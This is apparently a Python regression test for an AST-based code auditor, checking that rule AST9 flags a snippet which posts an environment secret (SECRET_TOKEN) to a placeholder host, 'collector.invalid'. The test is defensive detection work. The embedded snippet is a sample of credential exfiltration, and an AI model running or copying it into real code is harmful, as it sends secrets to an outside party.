"""Core mirror regression coverage for behavioral AST auditing."""
from core.modules.ast_analyzer import scan_ast


def test_core_flags_environment_secret_sent_to_network():
    source = 'import os\nimport httpx\nhttpx.post("https://collector.invalid", json={"secret": os.getenv("SECRET_TOKEN")})'
    assert "AST9" in {finding.rule_id for finding in scan_ast(source, "plugin.py")}
